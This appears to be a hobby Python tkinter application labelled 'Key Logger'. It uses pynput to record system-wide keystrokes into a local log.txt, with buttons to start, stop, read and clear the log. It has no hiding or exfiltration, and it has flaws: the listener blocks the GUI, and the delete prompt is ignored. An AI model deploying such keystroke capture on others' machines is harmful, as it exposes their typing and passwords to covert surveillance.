from tkinter import *
from tkinter import messagebox
from pynput.keyboard import Key, Listener

# display
screen = Tk()

# entering screen title
screen.title("Key Logger")
screen.configure(bg='black')
screen.geometry('450x440')
screen.minsize(width=450, height=440)
screen.maxsize(width=450, height=440)

# *************************************************** Key Logger ****************************************************

# listen = Listener
keys = []
started_listener = False
stopped_listener = True


def on_press(key):
    global keys
    keys.append(key)
    if key == Key.backspace:
        keys.pop(-2)
    elif key == Key.space or key == Key.enter:
        write_to_file(keys)
        keys = []


def exit_():
    global started_listener, stopped_listener
    if started_listener and not stopped_listener:
        started_listener = False
        stopped_listener = True
        return True
    else:
        messagebox.showinfo(title="Message", message="Key Logger not started")


def write_to_file(text):
    with open("log.txt", 'a') as f:
        for key in text:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write(" ")
            elif k.find("enter") > 0:
                f.write("\n")
            elif k.find("Key.") == -1:
                f.write(k)


def read():
    with open("log.txt", 'r') as f:
        file = f.read()
        print(file)


def on_release(key):
    if exit_():
        print("stopped")
        return False


def delete():
    messagebox.askyesno(title="Message", message="Clear the log file?")
    with open("log.txt", "w") as f:
        f.write("")


def start():
    global started_listener, stopped_listener
    if stopped_listener and not started_listener:
        started_listener = True
        stopped_listener = False

        print("listener started")
        with Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()

    elif started_listener and not stopped_listener:
        messagebox.showinfo(title="Message", message="Key Logger already started")

# **************************************************** End *************************************************************

# ************************************************** Buttons ***********************************************************


start_btn = Button(screen, text="Start Logging", bg="powder blue", font=("arial", 12, "bold"), bd=2,
                   activeforeground="yellow", activebackground="green", command=lambda: start())
start_btn.grid(row=4, columnspan=2)

stop_btn = Button(screen, text="Stop Logging", bg="light grey", font=("arial", 12, "bold"), bd=2,
                  activeforeground="yellow", activebackground="green", command=lambda: exit_())
stop_btn.grid(row=4, columnspan=2, column=3)

read_btn = Button(screen, text="Read Log file", bg="salmon", font=("arial", 12, "bold"), bd=2,
                  activeforeground="yellow", activebackground="green", command=lambda: read())
read_btn.grid(row=5, columnspan=2)

delete_btn = Button(screen, text="Delete Log file", bg="black", fg="red", font=("arial", 12, "italic bold"), bd=2,
                    activeforeground="yellow", activebackground="red", command=lambda: delete())
delete_btn.grid(row=5, columnspan=2, column=3)

# **************************************************** End ************************************************************


# main loop
screen.mainloop()

# **************************************************** End ************************************************************
